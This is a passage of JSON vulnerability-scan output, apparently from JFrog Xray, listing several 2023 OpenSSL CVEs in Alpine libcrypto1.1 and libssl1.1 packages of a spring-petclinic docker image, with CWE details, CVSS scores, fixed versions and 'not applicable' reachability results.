         "summary": "The public API function BIO_new_NDEF is a helper function used for streaming\nASN.1 data via a BIO. It is primarily used internally to OpenSSL to support the\nSMIME, CMS and PKCS7 streaming capabilities, but may also be called directly by\nend user applications.\n\nThe function receives a BIO from the caller, prepends a new BIO_f_asn1 filter\nBIO onto the front of it to form a BIO chain, and then returns the new head of\nthe BIO chain to the caller. Under certain conditions, for example if a CMS\nrecipient public key is invalid, the new filter BIO is freed and the function\nreturns a NULL result indicating a failure. However, in this case, the BIO chain\nis not properly cleaned up and the BIO passed by the caller still retains\ninternal pointers to the previously freed filter BIO. If the caller then goes on\nto call BIO_pop() on the BIO then a use-after-free will occur. This will most\nlikely result in a crash.\n\n\n\nThis scenario occurs directly in the internal function B64_write_ASN1() which\nmay cause BIO_new_NDEF() to be called and will subsequently call BIO_pop() on\nthe BIO. This internal function is in turn called by the public API functions\nPEM_write_bio_ASN1_stream, PEM_write_bio_CMS_stream, PEM_write_bio_PKCS7_stream,\nSMIME_write_ASN1, SMIME_write_CMS and SMIME_write_PKCS7.\n\nOther public API functions that may be impacted by this include\ni2d_ASN1_bio_stream, BIO_new_CMS, BIO_new_PKCS7, i2d_CMS_bio_stream and\ni2d_PKCS7_bio_stream.\n\nThe OpenSSL cms and smime command line applications are similarly affected.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libcrypto1.1",
         "source_id": "alpine://3.14:libcrypto1.1",
         "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libcrypto1.1",
            "vulnerable_versions": [
               "< 1.1.1t-r0"
            ],
            "fixed_versions": [
               "1.1.1t-r0"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-0215",
                     "cwe": [
                        "CWE-416"
                     ],
                     "cwe_details": {
                        "CWE-416": {
                           "name": "Use After Free",
                           "description": "Referencing memory after it has been freed can cause a program to crash, use unexpected values, or execute code.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "4"
                              }
                           ]
                        }
                     },
                     "cvss_v3": "7.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "The public API function BIO_new_NDEF is a helper function used for streaming\nASN.1 data via a BIO. It is primarily used internally to OpenSSL to support the\nSMIME, CMS and PKCS7 streaming capabilities, but may also be called directly by\nend user applications.\n\nThe function receives a BIO from the caller, prepends a new BIO_f_asn1 filter\nBIO onto the front of it to form a BIO chain, and then returns the new head of\nthe BIO chain to the caller. Under certain conditions, for example if a CMS\nrecipient public key is invalid, the new filter BIO is freed and the function\nreturns a NULL result indicating a failure. However, in this case, the BIO chain\nis not properly cleaned up and the BIO passed by the caller still retains\ninternal pointers to the previously freed filter BIO. If the caller then goes on\nto call BIO_pop() on the BIO then a use-after-free will occur. This will most\nlikely result in a crash.\n\n\n\nThis scenario occurs directly in the internal function B64_write_ASN1() which\nmay cause BIO_new_NDEF() to be called and will subsequently call BIO_pop() on\nthe BIO. This internal function is in turn called by the public API functions\nPEM_write_bio_ASN1_stream, PEM_write_bio_CMS_stream, PEM_write_bio_PKCS7_stream,\nSMIME_write_ASN1, SMIME_write_CMS and SMIME_write_PKCS7.\n\nOther public API functions that may be impacted by this include\ni2d_ASN1_bio_stream, BIO_new_CMS, BIO_new_PKCS7, i2d_CMS_bio_stream and\ni2d_PKCS7_bio_stream.\n\nThe OpenSSL cms and smime command line applications are similarly affected.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "cve_id": "CVE-2023-0215",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "No references to the vulnerable function were found",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "vulnerability_id": "CVE-2023-0215",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-608309",
         "severity": "High",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "The public API function BIO_new_NDEF is a helper function used for streaming\nASN.1 data via a BIO. It is primarily used internally to OpenSSL to support the\nSMIME, CMS and PKCS7 streaming capabilities, but may also be called directly by\nend user applications.\n\nThe function receives a BIO from the caller, prepends a new BIO_f_asn1 filter\nBIO onto the front of it to form a BIO chain, and then returns the new head of\nthe BIO chain to the caller. Under certain conditions, for example if a CMS\nrecipient public key is invalid, the new filter BIO is freed and the function\nreturns a NULL result indicating a failure. However, in this case, the BIO chain\nis not properly cleaned up and the BIO passed by the caller still retains\ninternal pointers to the previously freed filter BIO. If the caller then goes on\nto call BIO_pop() on the BIO then a use-after-free will occur. This will most\nlikely result in a crash.\n\n\n\nThis scenario occurs directly in the internal function B64_write_ASN1() which\nmay cause BIO_new_NDEF() to be called and will subsequently call BIO_pop() on\nthe BIO. This internal function is in turn called by the public API functions\nPEM_write_bio_ASN1_stream, PEM_write_bio_CMS_stream, PEM_write_bio_PKCS7_stream,\nSMIME_write_ASN1, SMIME_write_CMS and SMIME_write_PKCS7.\n\nOther public API functions that may be impacted by this include\ni2d_ASN1_bio_stream, BIO_new_CMS, BIO_new_PKCS7, i2d_CMS_bio_stream and\ni2d_PKCS7_bio_stream.\n\nThe OpenSSL cms and smime command line applications are similarly affected.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libssl1.1",
         "source_id": "alpine://3.14:libssl1.1",
         "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libssl1.1",
            "vulnerable_versions": [
               "< 1.1.1t-r0"
            ],
            "fixed_versions": [
               "1.1.1t-r0"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-0215",
                     "cwe": [
                        "CWE-416"
                     ],
                     "cwe_details": {
                        "CWE-416": {
                           "name": "Use After Free",
                           "description": "Referencing memory after it has been freed can cause a program to crash, use unexpected values, or execute code.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "4"
                              }
                           ]
                        }
                     },
                     "cvss_v3": "7.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "The public API function BIO_new_NDEF is a helper function used for streaming\nASN.1 data via a BIO. It is primarily used internally to OpenSSL to support the\nSMIME, CMS and PKCS7 streaming capabilities, but may also be called directly by\nend user applications.\n\nThe function receives a BIO from the caller, prepends a new BIO_f_asn1 filter\nBIO onto the front of it to form a BIO chain, and then returns the new head of\nthe BIO chain to the caller. Under certain conditions, for example if a CMS\nrecipient public key is invalid, the new filter BIO is freed and the function\nreturns a NULL result indicating a failure. However, in this case, the BIO chain\nis not properly cleaned up and the BIO passed by the caller still retains\ninternal pointers to the previously freed filter BIO. If the caller then goes on\nto call BIO_pop() on the BIO then a use-after-free will occur. This will most\nlikely result in a crash.\n\n\n\nThis scenario occurs directly in the internal function B64_write_ASN1() which\nmay cause BIO_new_NDEF() to be called and will subsequently call BIO_pop() on\nthe BIO. This internal function is in turn called by the public API functions\nPEM_write_bio_ASN1_stream, PEM_write_bio_CMS_stream, PEM_write_bio_PKCS7_stream,\nSMIME_write_ASN1, SMIME_write_CMS and SMIME_write_PKCS7.\n\nOther public API functions that may be impacted by this include\ni2d_ASN1_bio_stream, BIO_new_CMS, BIO_new_PKCS7, i2d_CMS_bio_stream and\ni2d_PKCS7_bio_stream.\n\nThe OpenSSL cms and smime command line applications are similarly affected.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "cve_id": "CVE-2023-0215",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "No references to the vulnerable function were found",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "vulnerability_id": "CVE-2023-0215",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-607993",
         "severity": "High",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "A NULL pointer can be dereferenced when signatures are being\nverified on PKCS7 signed or signedAndEnveloped data. In case the hash\nalgorithm used for the signature is known to the OpenSSL library but\nthe implementation of the hash algorithm is not available the digest\ninitialization will fail. There is a missing check for the return\nvalue from the initialization function which later leads to invalid\nusage of the digest API most likely leading to a crash.\n\nThe unavailability of an algorithm can be caused by using FIPS\nenabled configuration of providers or more commonly by not loading\nthe legacy provider.\n\nPKCS7 data is processed by the SMIME library calls and also by the\ntime stamp (TS) library calls. The TLS implementation in OpenSSL does\nnot call these functions however third party applications would be\naffected if they call these functions to verify signatures on untrusted\ndata.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libcrypto1.1",
         "source_id": "alpine://3.14:libcrypto1.1",
         "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libcrypto1.1",
            "vulnerable_versions": [
               "< 3.0.8-r0"
            ],
            "fixed_versions": [
               "3.0.8-r0"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-0401",
                     "cwe": [
                        "CWE-476"
                     ],
                     "cwe_details": {
                        "CWE-476": {
                           "name": "NULL Pointer Dereference",
                           "description": "A NULL pointer dereference occurs when the application dereferences a pointer that it expects to be valid, but is NULL, typically causing a crash or exit.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "12"
                              }
                           ]
                        }
                     },
                     "cvss_v3": "7.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "A NULL pointer can be dereferenced when signatures are being\nverified on PKCS7 signed or signedAndEnveloped data. In case the hash\nalgorithm used for the signature is known to the OpenSSL library but\nthe implementation of the hash algorithm is not available the digest\ninitialization will fail. There is a missing check for the return\nvalue from the initialization function which later leads to invalid\nusage of the digest API most likely leading to a crash.\n\nThe unavailability of an algorithm can be caused by using FIPS\nenabled configuration of providers or more commonly by not loading\nthe legacy provider.\n\nPKCS7 data is processed by the SMIME library calls and also by the\ntime stamp (TS) library calls. The TLS implementation in OpenSSL does\nnot call these functions however third party applications would be\naffected if they call these functions to verify signatures on untrusted\ndata.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "cve_id": "CVE-2023-0401",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "No references to the vulnerable function were found",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "vulnerability_id": "CVE-2023-0401",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-607993",
         "severity": "High",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "A NULL pointer can be dereferenced when signatures are being\nverified on PKCS7 signed or signedAndEnveloped data. In case the hash\nalgorithm used for the signature is known to the OpenSSL library but\nthe implementation of the hash algorithm is not available the digest\ninitialization will fail. There is a missing check for the return\nvalue from the initialization function which later leads to invalid\nusage of the digest API most likely leading to a crash.\n\nThe unavailability of an algorithm can be caused by using FIPS\nenabled configuration of providers or more commonly by not loading\nthe legacy provider.\n\nPKCS7 data is processed by the SMIME library calls and also by the\ntime stamp (TS) library calls. The TLS implementation in OpenSSL does\nnot call these functions however third party applications would be\naffected if they call these functions to verify signatures on untrusted\ndata.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libssl1.1",
         "source_id": "alpine://3.14:libssl1.1",
         "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libssl1.1",
            "vulnerable_versions": [
               "< 3.0.8-r0"
            ],
            "fixed_versions": [
               "3.0.8-r0"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-0401",
                     "cwe": [
                        "CWE-476"
                     ],
                     "cwe_details": {
                        "CWE-476": {
                           "name": "NULL Pointer Dereference",
                           "description": "A NULL pointer dereference occurs when the application dereferences a pointer that it expects to be valid, but is NULL, typically causing a crash or exit.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "12"
                              }
                           ]
                        }
                     },
                     "cvss_v3": "7.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "A NULL pointer can be dereferenced when signatures are being\nverified on PKCS7 signed or signedAndEnveloped data. In case the hash\nalgorithm used for the signature is known to the OpenSSL library but\nthe implementation of the hash algorithm is not available the digest\ninitialization will fail. There is a missing check for the return\nvalue from the initialization function which later leads to invalid\nusage of the digest API most likely leading to a crash.\n\nThe unavailability of an algorithm can be caused by using FIPS\nenabled configuration of providers or more commonly by not loading\nthe legacy provider.\n\nPKCS7 data is processed by the SMIME library calls and also by the\ntime stamp (TS) library calls. The TLS implementation in OpenSSL does\nnot call these functions however third party applications would be\naffected if they call these functions to verify signatures on untrusted\ndata.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "cve_id": "CVE-2023-0401",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "No references to the vulnerable function were found",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "vulnerability_id": "CVE-2023-0401",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-607992",
         "severity": "High",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "An invalid pointer dereference on read can be triggered when an\napplication tries to check a malformed DSA public key by the\nEVP_PKEY_public_check() function. This will most likely lead\nto an application crash. This function can be called on public\nkeys supplied from untrusted sources which could allow an attacker\nto cause a denial of service attack.\n\nThe TLS implementation in OpenSSL does not call this function\nbut applications might call the function if there are additional\nsecurity requirements imposed by standards such as FIPS 140-3.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libcrypto1.1",
         "source_id": "alpine://3.14:libcrypto1.1",
         "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libcrypto1.1",
            "vulnerable_versions": [
               "< 3.0.8-r0"
            ],
            "fixed_versions": [
               "3.0.8-r0"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-0217",
                     "cwe": [
                        "CWE-476"
                     ],
                     "cwe_details": {
                        "CWE-476": {
                           "name": "NULL Pointer Dereference",
                           "description": "A NULL pointer dereference occurs when the application dereferences a pointer that it expects to be valid, but is NULL, typically causing a crash or exit.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "12"
                              }
                           ]
                        }
                     },
                     "cvss_v3": "7.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "An invalid pointer dereference on read can be triggered when an\napplication tries to check a malformed DSA public key by the\nEVP_PKEY_public_check() function. This will most likely lead\nto an application crash. This function can be called on public\nkeys supplied from untrusted sources which could allow an attacker\nto cause a denial of service attack.\n\nThe TLS implementation in OpenSSL does not call this function\nbut applications might call the function if there are additional\nsecurity requirements imposed by standards such as FIPS 140-3.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "cve_id": "CVE-2023-0217",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "The vulnerable function `EVP_PKEY_public_check` is never called",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "vulnerability_id": "CVE-2023-0217",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-607992",
         "severity": "High",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "An invalid pointer dereference on read can be triggered when an\napplication tries to check a malformed DSA public key by the\nEVP_PKEY_public_check() function. This will most likely lead\nto an application crash. This function can be called on public\nkeys supplied from untrusted sources which could allow an attacker\nto cause a denial of service attack.\n\nThe TLS implementation in OpenSSL does not call this function\nbut applications might call the function if there are additional\nsecurity requirements imposed by standards such as FIPS 140-3.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libssl1.1",
         "source_id": "alpine://3.14:libssl1.1",
         "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libssl1.1",
            "vulnerable_versions": [
               "< 3.0.8-r0"
            ],
            "fixed_versions": [
               "3.0.8-r0"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-0217",
                     "cwe": [
                        "CWE-476"
                     ],
                     "cwe_details": {
                        "CWE-476": {
                           "name": "NULL Pointer Dereference",
                           "description": "A NULL pointer dereference occurs when the application dereferences a pointer that it expects to be valid, but is NULL, typically causing a crash or exit.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "12"
                              }
                           ]
                        }
                     },
                     "cvss_v3": "7.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "An invalid pointer dereference on read can be triggered when an\napplication tries to check a malformed DSA public key by the\nEVP_PKEY_public_check() function. This will most likely lead\nto an application crash. This function can be called on public\nkeys supplied from untrusted sources which could allow an attacker\nto cause a denial of service attack.\n\nThe TLS implementation in OpenSSL does not call this function\nbut applications might call the function if there are additional\nsecurity requirements imposed by standards such as FIPS 140-3.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "cve_id": "CVE-2023-0217",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "The vulnerable function `EVP_PKEY_public_check` is never called",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "vulnerability_id": "CVE-2023-0217",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-607991",
         "severity": "High",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "An invalid pointer dereference on read can be triggered when an\napplication tries to load malformed PKCS7 data with the\nd2i_PKCS7(), d2i_PKCS7_bio() or d2i_PKCS7_fp() functions.\n\nThe result of the dereference is an application crash which could\nlead to a denial of service attack. The TLS implementation in OpenSSL\ndoes not call this function however third party applications might\ncall these functions on untrusted data.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libcrypto1.1",
         "source_id": "alpine://3.14:libcrypto1.1",
         "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libcrypto1.1",
            "vulnerable_versions": [
               "< 3.0.8-r0"
            ],
            "fixed_versions": [
               "3.0.8-r0"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-0216",
                     "cwe": [
                        "CWE-476"
                     ],
                     "cwe_details": {
                        "CWE-476": {
                           "name": "NULL Pointer Dereference",
                           "description": "A NULL pointer dereference occurs when the application dereferences a pointer that it expects to be valid, but is NULL, typically causing a crash or exit.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "12"
                              }
                           ]
                        }
                     },
                     "cvss_v3": "7.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "An invalid pointer dereference on read can be triggered when an\napplication tries to load malformed PKCS7 data with the\nd2i_PKCS7(), d2i_PKCS7_bio() or d2i_PKCS7_fp() functions.\n\nThe result of the dereference is an application crash which could\nlead to a denial of service attack. The TLS implementation in OpenSSL\ndoes not call this function however third party applications might\ncall these functions on untrusted data.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "cve_id": "CVE-2023-0216",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "The vulnerable OpenSSL functions are never called",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "vulnerability_id": "CVE-2023-0216",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-607991",
         "severity": "High",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "An invalid pointer dereference on read can be triggered when an\napplication tries to load malformed PKCS7 data with the\nd2i_PKCS7(), d2i_PKCS7_bio() or d2i_PKCS7_fp() functions.\n\nThe result of the dereference is an application crash which could\nlead to a denial of service attack. The TLS implementation in OpenSSL\ndoes not call this function however third party applications might\ncall these functions on untrusted data.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libssl1.1",
         "source_id": "alpine://3.14:libssl1.1",
         "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libssl1.1",
            "vulnerable_versions": [
               "< 3.0.8-r0"
            ],
            "fixed_versions": [
               "3.0.8-r0"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-0216",
                     "cwe": [
                        "CWE-476"
                     ],
                     "cwe_details": {
                        "CWE-476": {
                           "name": "NULL Pointer Dereference",
                           "description": "A NULL pointer dereference occurs when the application dereferences a pointer that it expects to be valid, but is NULL, typically causing a crash or exit.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "12"
                              }
                           ]
                        }
                     },
                     "cvss_v3": "7.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "An invalid pointer dereference on read can be triggered when an\napplication tries to load malformed PKCS7 data with the\nd2i_PKCS7(), d2i_PKCS7_bio() or d2i_PKCS7_fp() functions.\n\nThe result of the dereference is an application crash which could\nlead to a denial of service attack. The TLS implementation in OpenSSL\ndoes not call this function however third party applications might\ncall these functions on untrusted data.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "cve_id": "CVE-2023-0216",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "The vulnerable OpenSSL functions are never called",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "vulnerability_id": "CVE-2023-0216",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-607950",
         "severity": "High",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "There is a type confusion vulnerability relating to X.400 address processing\ninside an X.509 GeneralName. X.400 addresses were parsed as an ASN1_STRING but\nthe public structure definition for GENERAL_NAME incorrectly specified the type\nof the x400Address field as ASN1_TYPE. This field is subsequently interpreted by\nthe OpenSSL function GENERAL_NAME_cmp as an ASN1_TYPE rather than an\nASN1_STRING.\n\nWhen CRL checking is enabled (i.e. the application sets the\nX509_V_FLAG_CRL_CHECK flag), this vulnerability may allow an attacker to pass\narbitrary pointers to a memcmp call, enabling them to read memory contents or\nenact a denial of service. In most cases, the attack requires the attacker to\nprovide both the certificate chain and CRL, neither of which need to have a\nvalid signature. If the attacker only controls one of these inputs, the other\ninput must already contain an X.400 address as a CRL distribution point, which\nis uncommon. As such, this vulnerability is most likely to only affect\napplications which have implemented their own functionality for retrieving CRLs\nover a network.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libssl1.1",
         "source_id": "alpine://3.14:libssl1.1",
         "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libssl1.1",
            "vulnerable_versions": [
               "< 1.1.1t-r0"
            ],
            "fixed_versions": [
               "1.1.1t-r0"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-0286",
                     "cwe": [
                        "CWE-843"
                     ],
                     "cwe_details": {
                        "CWE-843": {
                           "name": "Access of Resource Using Incompatible Type ('Type Confusion')",
                           "description": "The product allocates or initializes a resource such as a pointer, object, or variable using one type, but it later accesses that resource using a type that is incompatible with the original type."
                        }
                     },
                     "cvss_v3": "7.4/CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:H"
                  }
               ],
               "description": "There is a type confusion vulnerability relating to X.400 address processing\ninside an X.509 GeneralName. X.400 addresses were parsed as an ASN1_STRING but\nthe public structure definition for GENERAL_NAME incorrectly specified the type\nof the x400Address field as ASN1_TYPE. This field is subsequently interpreted by\nthe OpenSSL function GENERAL_NAME_cmp as an ASN1_TYPE rather than an\nASN1_STRING.\n\nWhen CRL checking is enabled (i.e. the application sets the\nX509_V_FLAG_CRL_CHECK flag), this vulnerability may allow an attacker to pass\narbitrary pointers to a memcmp call, enabling them to read memory contents or\nenact a denial of service. In most cases, the attack requires the attacker to\nprovide both the certificate chain and CRL, neither of which need to have a\nvalid signature. If the attacker only controls one of these inputs, the other\ninput must already contain an X.400 address as a CRL distribution point, which\nis uncommon. As such, this vulnerability is most likely to only affect\napplications which have implemented their own functionality for retrieving CRLs\nover a network.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "cve_id": "CVE-2023-0286",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "No references to the vulnerable function were found",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "vulnerability_id": "CVE-2023-0286",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-607950",
         "severity": "High",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "There is a type confusion vulnerability relating to X.400 address processing\ninside an X.509 GeneralName. X.400 addresses were parsed as an ASN1_STRING but\nthe public structure definition for GENERAL_NAME incorrectly specified the type\nof the x400Address field as ASN1_TYPE. This field is subsequently interpreted by\nthe OpenSSL function GENERAL_NAME_cmp as an ASN1_TYPE rather than an\nASN1_STRING.\n\nWhen CRL checking is enabled (i.e. the application sets the\nX509_V_FLAG_CRL_CHECK flag), this vulnerability may allow an attacker to pass\narbitrary pointers to a memcmp call, enabling them to read memory contents or\nenact a denial of service. In most cases, the attack requires the attacker to\nprovide both the certificate chain and CRL, neither of which need to have a\nvalid signature. If the attacker only controls one of these inputs, the other\ninput must already contain an X.400 address as a CRL distribution point, which\nis uncommon. As such, this vulnerability is most likely to only affect\napplications which have implemented their own functionality for retrieving CRLs\nover a network.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libcrypto1.1",
         "source_id": "alpine://3.14:libcrypto1.1",
         "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libcrypto1.1",
            "vulnerable_versions": [
               "< 1.1.1t-r0"
            ],
            "fixed_versions": [
               "1.1.1t-r0"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-0286",
                     "cwe": [
                        "CWE-843"
                     ],
                     "cwe_details": {
                        "CWE-843": {
                           "name": "Access of Resource Using Incompatible Type ('Type Confusion')",
                           "description": "The product allocates or initializes a resource such as a pointer, object, or variable using one type, but it later accesses that resource using a type that is incompatible with the original type."
                        }
                     },
